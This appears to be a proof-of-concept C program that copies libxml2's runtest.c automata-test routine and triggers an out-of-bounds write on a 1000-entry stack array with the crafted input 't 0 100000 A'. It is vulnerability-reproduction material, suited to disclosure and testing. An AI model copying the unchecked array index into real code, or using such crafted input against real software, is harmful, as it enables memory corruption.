#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

// Minimal stand-ins for libxml2 automata types/APIs used by runtest.c
typedef unsigned char xmlChar;
#define BAD_CAST (xmlChar *)

typedef struct _xmlAutomata {
    int dummy;
} xmlAutomata, *xmlAutomataPtr;

typedef struct _xmlAutomataState {
    int id;
} xmlAutomataState, *xmlAutomataStatePtr;

static xmlAutomataPtr xmlNewAutomata(void) {
    xmlAutomataPtr am = (xmlAutomataPtr)malloc(sizeof(xmlAutomata));
    return am;
}

static void xmlFreeAutomata(xmlAutomataPtr am) {
    free(am);
}

static xmlAutomataStatePtr xmlAutomataNewState(xmlAutomataPtr am) {
    (void)am;
    xmlAutomataStatePtr st = (xmlAutomataStatePtr)malloc(sizeof(xmlAutomataState));
    if (st) st->id = 0;
    return st;
}

static xmlAutomataStatePtr xmlAutomataGetInitState(xmlAutomataPtr am) {
    (void)am;
    static xmlAutomataState init_state;
    init_state.id = 42;
    return &init_state;
}

static void xmlAutomataNewTransition(xmlAutomataPtr am,
                                     xmlAutomataStatePtr from,
                                     xmlAutomataStatePtr to,
                                     const xmlChar *token,
                                     void *data) {
    (void)am; (void)from; (void)to; (void)token; (void)data;
    // Stub: no-op
}

static void xmlAutomataNewEpsilon(xmlAutomataPtr am,
                                  xmlAutomataStatePtr from,
                                  xmlAutomataStatePtr to) {
    (void)am; (void)from; (void)to;
}

static void xmlAutomataSetFinalState(xmlAutomataPtr am,
                                     xmlAutomataStatePtr st) {
    (void)am; (void)st;
}

// Minimal scanNumber equivalent from runtest.c
static int scanNumber(char **pp) {
    char *p = *pp;
    int sign = 1;
    long val = 0;

    // Skip optional spaces
    while (*p == ' ') p++;

    if (*p == '+') {
        p++;
    } else if (*p == '-') {
        sign = -1;
        p++;
    }
    while (*p >= '0' && *p <= '9') {
        val = val * 10 + (*p - '0');
        p++;
    }
    *pp = p;
    return (int)(sign * val);
}

// Vulnerable function logic reproduced from runtest.c around line 4960
static int automataTest(const char *filename) {
    FILE *input = fopen(filename, "r");
    if (input == NULL) {
        perror("fopen");
        return -1;
    }

    xmlAutomataPtr am = xmlNewAutomata();
    if (am == NULL) {
        fclose(input);
        return -1;
    }

    char expr[4500];
    xmlAutomataStatePtr states[1000]; // Stack array that will be overflowed
    memset(states, 0, sizeof(states));

    states[0] = xmlAutomataGetInitState(am);
    if (states[0] == NULL) {
        fprintf(stderr, "Cannot get start state\n");
        xmlFreeAutomata(am);
        fclose(input);
        return -1;
    }

    int ret = 0;

    while (fgets(expr, sizeof(expr), input) != NULL) {
        if (expr[0] == '#')
            continue;
        int len = (int)strlen(expr);
        len--;
        while ((len >= 0) &&
               ((expr[len] == '\n') || (expr[len] == '\t') ||
                (expr[len] == '\r') || (expr[len] == ' '))) len--;
        expr[len + 1] = 0;
        if (len >= 0) {
            if ((am != NULL) && (expr[0] == 't') && (expr[1] == ' ')) {
                char *ptr = &expr[2];
                int from, to;

                from = scanNumber(&ptr);
                if (*ptr != ' ') {
                    fprintf(stderr, "Bad line %s\n", expr);
                    break;
                }
                if (states[from] == NULL)
                    states[from] = xmlAutomataNewState(am);
                ptr++;
                to = scanNumber(&ptr);
                if (*ptr != ' ') {
                    fprintf(stderr, "Bad line %s\n", expr);
                    break;
                }
                // Vulnerable access: 'to' is not validated to be < 1000
                if (states[to] == NULL)
                    states[to] = xmlAutomataNewState(am);
                ptr++;
                xmlAutomataNewTransition(am, states[from], states[to], BAD_CAST ptr, NULL);
            } else if ((am != NULL) && (expr[0] == 'e') && (expr[1] == ' ')) {
                char *ptr = &expr[2];
                int from, to;

                from = scanNumber(&ptr);
                if (*ptr != ' ') {
                    fprintf(stderr, "Bad line %s\n", expr);
                    break;
                }
                if (states[from] == NULL)
                    states[from] = xmlAutomataNewState(am);
                ptr++;
                to = scanNumber(&ptr);
                if (states[to] == NULL)
                    states[to] = xmlAutomataNewState(am);
                xmlAutomataNewEpsilon(am, states[from], states[to]);
            } else if ((am != NULL) && (expr[0] == 'f') && (expr[1] == ' ')) {
                char *ptr = &expr[2];
                int state;

                state = scanNumber(&ptr);
                if (states[state] == NULL) {
                    fprintf(stderr, "Bad state %d : %s\n", state, expr);
                    break;
                }
                xmlAutomataSetFinalState(am, states[state]);
            }
        }
    }

    fclose(input);
    xmlFreeAutomata(am);
    return ret;
}

int main(void) {
    char tmpl[] = "/tmp/automataXXXXXX";
    int fd = mkstemp(tmpl);
    if (fd < 0) {
        perror("mkstemp");
        return 1;
    }

    // Craft input that sets a huge 'to' index to overflow states[1000]
    const char *data = "t 0 100000 A\n"; // 'to' = 100000 >> 999
    ssize_t w = write(fd, data, strlen(data));
    (void)w;
    close(fd);

    // Trigger the vulnerable code path
    int rc = automataTest(tmpl);
    (void)rc;

    // Clean up the temp file
    unlink(tmpl);
    return 0;
}
